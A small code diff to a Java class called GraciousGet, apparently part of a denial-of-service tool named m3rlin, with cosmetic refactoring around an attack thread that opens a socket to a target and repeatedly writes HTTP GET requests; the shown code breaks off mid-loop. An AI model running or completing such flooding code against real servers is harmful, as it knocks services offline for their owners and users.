@@ -4,7 +4,6 @@ import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
 import java.net.ConnectException;
-import java.net.InetAddress;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.UnknownHostException;
@@ -12,7 +11,6 @@ import java.net.UnknownHostException;
 import org.apache.log4j.Logger;
 
 import m3rlin.Attack;
-
 
 public class GraciousGet extends Attack {
 
@@ -25,9 +23,9 @@ public class GraciousGet extends Attack {
 	public void run() {
 		try {
 			isRunning = true;
-			socket = new Socket(InetAddress.getByName(hostname), port);
+			socket = new Socket(hostname, port);
 			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));
-			log.info("Attack thread started");
+			log.info("Attack thread started...");
 			while(isRunning && !isInterrupted()) {
 				writer.write("GET / HTTP/1.1\r\n");
 				writer.write("Host: " + hostname + " \r\n");
